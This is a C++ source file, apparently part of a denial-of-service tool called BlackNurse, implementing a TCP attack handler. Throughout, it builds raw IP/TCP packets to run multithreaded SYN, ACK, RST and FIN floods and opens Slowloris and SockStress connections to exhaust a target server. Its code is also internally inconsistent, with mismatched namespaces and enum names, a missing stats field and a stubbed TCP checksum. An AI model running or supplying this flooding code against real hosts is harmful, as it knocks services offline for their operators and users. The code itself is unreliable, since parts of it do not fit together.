#include "tcp_handler.hpp"
#include "../common/logger.hpp"

using namespace blacknurse;
#include <iostream>
#include <thread>
#include <random>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <fcntl.h>
#include <errno.h>

// TCP flags
#define TH_SYN 0x02
#define TH_ACK 0x10
#define TH_RST 0x04
#define TH_FIN 0x01
#define TH_PUSH 0x08
#define TH_URG 0x20

namespace BlackNurse {

TcpHandler::TcpHandler(const Config& config) 
    : config_(config), running_(false), stats_{} {
    
    // Setup default TCP configuration
    tcp_config_.attack_type = TcpAttackType::SYN_FLOOD;
    tcp_config_.source_port_range = {1024, 65535};
    tcp_config_.destination_port = 80;
    tcp_config_.threads = config_.threads;
    tcp_config_.packets_per_second = config_.rate_limit;
    tcp_config_.use_raw_sockets = true;
    tcp_config_.spoof_source_ip = false;
    tcp_config_.fragment_packets = false;
    tcp_config_.randomize_flags = false;
    
    Logger::info("TCP Handler initialized for target: " + config_.target_ip);
}

TcpHandler::~TcpHandler() {
    stop_attack();
}

bool TcpHandler::initialize() {
    try {
        // Test if we can create raw sockets (requires root)
        if (tcp_config_.use_raw_sockets) {
            int test_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
            if (test_socket < 0) {
                Logger::warning("Cannot create raw sockets (requires root privileges)");
                tcp_config_.use_raw_sockets = false;
            } else {
                close(test_socket);
                Logger::info("Raw socket support enabled");
            }
        }
        
        // Test basic connectivity
        int test_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (test_socket < 0) {
            Logger::error("Failed to create test socket");
            return false;
        }
        
        struct sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(tcp_config_.destination_port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr.sin_addr);
        
        // Set non-blocking for quick test
        fcntl(test_socket, F_SETFL, O_NONBLOCK);
        
        connect(test_socket, (struct sockaddr*)&target_addr, sizeof(target_addr));
        close(test_socket);
        
        Logger::info("TCP target is reachable");
        return true;
        
    } catch (const std::exception& e) {
        Logger::error("TCP initialization failed: " + std::string(e.what()));
        return false;
    }
}

bool TcpHandler::start_attack() {
    if (running_) {
        Logger::warning("TCP attack is already running");
        return false;
    }
    
    running_ = true;
    start_time_ = std::chrono::steady_clock::now();
    
    Logger::info("Starting TCP attack with " + 
                std::to_string(tcp_config_.threads) + " threads");
    
    // Start worker threads
    for (int i = 0; i < tcp_config_.threads; ++i) {
        worker_threads_.emplace_back(&TcpHandler::worker_thread, this, i);
    }
    
    return true;
}

void TcpHandler::stop_attack() {
    if (!running_) {
        return;
    }
    
    Logger::info("Stopping TCP attack...");
    running_ = false;
    
    // Wait for all threads to finish
    for (auto& thread : worker_threads_) {
        if (thread.joinable()) {
            thread.join();
        }
    }
    worker_threads_.clear();
    
    Logger::info("TCP attack stopped");
}

AttackStats TcpHandler::get_stats() const {
    std::lock_guard<std::mutex> lock(stats_mutex_);
    AttackStats copy;
    copy.packets_sent = stats_.packets_sent.load();
    copy.packets_failed = stats_.packets_failed.load();
    copy.bytes_sent = stats_.bytes_sent.load();
    copy.connections_established = stats_.connections_established.load();
    copy.connections_failed = stats_.connections_failed.load();
    copy.current_rate = stats_.current_rate.load();
    copy.avg_response_time = stats_.avg_response_time.load();
    copy.start_time = stats_.start_time;
    copy.last_update = stats_.last_update;
    return copy;
}

void TcpHandler::worker_thread(int thread_id) {
    Logger::info("TCP worker thread " + std::to_string(thread_id) + " started");
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> port_dist(tcp_config_.source_port_range.first, 
                                             tcp_config_.source_port_range.second);
    
    auto last_packet_time = std::chrono::steady_clock::now();
    const auto packet_interval = std::chrono::microseconds(1000000 / tcp_config_.packets_per_second);
    
    while (running_) {
        auto now = std::chrono::steady_clock::now();
        
        // Rate limiting
        if (now - last_packet_time < packet_interval) {
            std::this_thread::sleep_for(std::chrono::microseconds(100));
            continue;
        }
        
        bool success = false;
        
        switch (tcp_config_.attack_type) {
            case AttackType::TCP_SYN_FLOOD:
                success = send_syn_packet(port_dist(gen));
                break;
            case AttackType::TCP_ACK_FLOOD:
                success = send_ack_packet(port_dist(gen));
                break;
            case AttackType::TCP_RST_FLOOD:
                success = send_rst_packet(port_dist(gen));
                break;
            case AttackType::TCP_FIN_FLOOD:
                success = send_fin_packet(port_dist(gen));
                break;
            case AttackType::SLOWLORIS:
                success = send_slowloris_connection();
                break;
            default:
                success = send_syn_packet(port_dist(gen));
                break;
        }
        
        last_packet_time = std::chrono::steady_clock::now();
        
        // Update statistics
        {
            std::lock_guard<std::mutex> lock(stats_mutex_);
            if (success) {
                stats_.packets_sent++;
            } else {
                stats_.errors++;
            }
        }
        
        // Small delay to prevent overwhelming the system
        std::this_thread::sleep_for(std::chrono::microseconds(10));
    }
    
    Logger::info("TCP worker thread " + std::to_string(thread_id) + " finished");
}

bool TcpHandler::send_syn_packet(uint16_t source_port) {
    if (tcp_config_.use_raw_sockets) {
        return send_raw_tcp_packet(source_port, TH_SYN);
    } else {
        return send_socket_connection(source_port);
    }
}

bool TcpHandler::send_ack_packet(uint16_t source_port) {
    return send_raw_tcp_packet(source_port, TH_ACK);
}

bool TcpHandler::send_rst_packet(uint16_t source_port) {
    return send_raw_tcp_packet(source_port, TH_RST);
}

bool TcpHandler::send_fin_packet(uint16_t source_port) {
    return send_raw_tcp_packet(source_port, TH_FIN);
}

bool TcpHandler::send_slowloris_connection() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return false;
    }
    
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(tcp_config_.destination_port);
    inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr.sin_addr);
    
    // Set non-blocking
    fcntl(sock, F_SETFL, O_NONBLOCK);
    
    // Connect and send partial HTTP request
    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0 || 
        errno == EINPROGRESS) {
        
        std::string partial_request = "GET / HTTP/1.1\r\nHost: " + config_.target_ip + "\r\n";
        send(sock, partial_request.c_str(), partial_request.length(), 0);
        
        // Keep connection open for a while
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    
    close(sock);
    return true;
}

bool TcpHandler::send_sockstress_packet(uint16_t source_port) {
    // SockStress attack - create many connections and keep them open
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return false;
    }
    
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(tcp_config_.destination_port);
    inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr.sin_addr);
    
    // Set very small receive buffer to cause backpressure
    int small_buffer = 1;
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &small_buffer, sizeof(small_buffer));
    
    fcntl(sock, F_SETFL, O_NONBLOCK);
    
    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0 || 
        errno == EINPROGRESS) {
        
        // Send some data to establish connection
        std::string data = "A";
        send(sock, data.c_str(), data.length(), 0);
        
        // Keep connection in list for later cleanup
        std::lock_guard<std::mutex> lock(connections_mutex_);
        open_connections_.push_back(sock);
        
        // Cleanup old connections periodically
        if (open_connections_.size() > 1000) {
            for (int i = 0; i < 100; ++i) {
                close(open_connections_[i]);
            }
            open_connections_.erase(open_connections_.begin(), open_connections_.begin() + 100);
        }
        
        return true;
    }
    
    close(sock);
    return false;
}

bool TcpHandler::send_raw_tcp_packet(uint16_t source_port, uint8_t flags) {
    if (!tcp_config_.use_raw_sockets) {
        return false;
    }
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        return false;
    }
    
    // Enable IP header inclusion
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    // Create packet buffer
    char packet[4096];
    memset(packet, 0, sizeof(packet));
    
    // IP header
    struct iphdr* ip_header = (struct iphdr*)packet;
    ip_header->version = 4;
    ip_header->ihl = 5;
    ip_header->tos = 0;
    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip_header->id = htons(rand());
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_TCP;
    ip_header->check = 0;
    inet_pton(AF_INET, "127.0.0.1", &ip_header->saddr); // Will be spoofed if enabled
    inet_pton(AF_INET, config_.target_ip.c_str(), &ip_header->daddr);
    
    // TCP header
    struct tcphdr* tcp_header = (struct tcphdr*)(packet + sizeof(struct iphdr));
    tcp_header->source = htons(source_port);
    tcp_header->dest = htons(tcp_config_.destination_port);
    tcp_header->seq = htonl(rand());
    tcp_header->ack_seq = 0;
    tcp_header->doff = 5;
    tcp_header->fin = (flags & TH_FIN) ? 1 : 0;
    tcp_header->syn = (flags & TH_SYN) ? 1 : 0;
    tcp_header->rst = (flags & TH_RST) ? 1 : 0;
    tcp_header->psh = (flags & TH_PUSH) ? 1 : 0;
    tcp_header->ack = (flags & TH_ACK) ? 1 : 0;
    tcp_header->urg = (flags & TH_URG) ? 1 : 0;
    tcp_header->window = htons(65535);
    tcp_header->check = 0;
    tcp_header->urg_ptr = 0;
    
    // Calculate checksums
    ip_header->check = calculate_ip_checksum(ip_header);
    tcp_header->check = calculate_tcp_checksum(ip_header, tcp_header);
    
    // Send packet
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(tcp_config_.destination_port);
    inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr.sin_addr);
    
    ssize_t sent = sendto(sock, packet, ntohs(ip_header->tot_len), 0,
                         (struct sockaddr*)&target_addr, sizeof(target_addr));
    
    close(sock);
    return sent > 0;
}

bool TcpHandler::send_socket_connection(uint16_t source_port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return false;
    }
    
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(tcp_config_.destination_port);
    inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr.sin_addr);
    
    // Set non-blocking for quick connection attempt
    fcntl(sock, F_SETFL, O_NONBLOCK);
    
    bool success = (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0 || 
                   errno == EINPROGRESS);
    
    close(sock);
    return success;
}

uint16_t TcpHandler::calculate_ip_checksum(struct iphdr* ip_header) {
    ip_header->check = 0;
    uint32_t sum = 0;
    uint16_t* ptr = (uint16_t*)ip_header;
    
    for (int i = 0; i < ip_header->ihl * 2; ++i) {
        sum += ntohs(ptr[i]);
    }
    
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    return htons(~sum);
}

uint16_t TcpHandler::calculate_tcp_checksum(struct iphdr* ip_header, struct tcphdr* tcp_header) {
    // Simplified TCP checksum calculation
    tcp_header->check = 0;
    return 0; // For now, let the kernel handle it
}

void TcpHandler::set_tcp_config(const TcpConfig& config) {
    if (running_) {
        Logger::warning("Cannot change TCP configuration while attack is running");
        return;
    }
    
    tcp_config_ = config;
    Logger::info("TCP configuration updated");
}

} // namespace BlackNurse